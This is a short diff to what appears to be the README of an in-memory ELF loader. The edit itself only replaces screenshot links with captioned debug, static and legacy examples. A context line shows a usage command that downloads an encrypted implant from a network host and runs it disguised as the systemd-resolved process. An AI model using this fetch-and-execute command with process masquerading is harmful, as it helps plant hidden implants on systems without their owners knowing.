@@ -44,6 +44,13 @@ make  legacy_static
 ./elfMemExecutor  http://192.168.1.190/test_implant.enc  0331afffba74a654b4e8  "/lib/systemd/systemd-resolved"
 
 ```
-![image](https://github.com/user-attachments/assets/697968a4-a874-4017-a082-87e4a9f3cc4d)
+### Example Debug Mode
+![image](https://github.com/user-attachments/assets/2d24acdb-6623-438e-904d-55094cf02396)
 
-![image](https://github.com/user-attachments/assets/5de749c4-25a4-4d62-bc85-273fcc3c34a2)
+
+### Example Static 
+![image](https://github.com/user-attachments/assets/6991bee4-2f0e-4d95-8812-7ee810b4afaa)
+
+### Example Legacy 
+![image](https://github.com/user-attachments/assets/905d9cad-0181-4b85-b83f-401228839c6c)
+
